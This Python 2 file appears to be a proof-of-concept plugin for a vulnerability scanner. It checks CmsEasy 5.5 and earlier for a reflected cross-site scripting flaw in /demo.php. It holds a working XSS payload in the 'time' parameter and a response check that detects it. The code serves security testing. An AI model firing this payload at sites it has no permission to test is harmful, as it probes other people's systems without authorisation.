# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'CmsEasy_0102' # 平台漏洞编号，留空
    name = 'CmsEasy 5.5 /demo.php 跨站脚本' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-11'  # 漏洞公布时间
    desc = '''
    CmsEasy /demo.php文件存在xss漏洞。
    ''' # 漏洞描述
    ref = 'Unknown',# 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-069363
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = '<=5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '659c008d-289d-4fa3-8e58-ba75ae9d8452' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target + "/demo.php?time=alert('f4aa169c58007f317b2de0b73cecbd92')"
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            if "time:alert('f4aa169c58007f317b2de0b73cecbd92')," in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()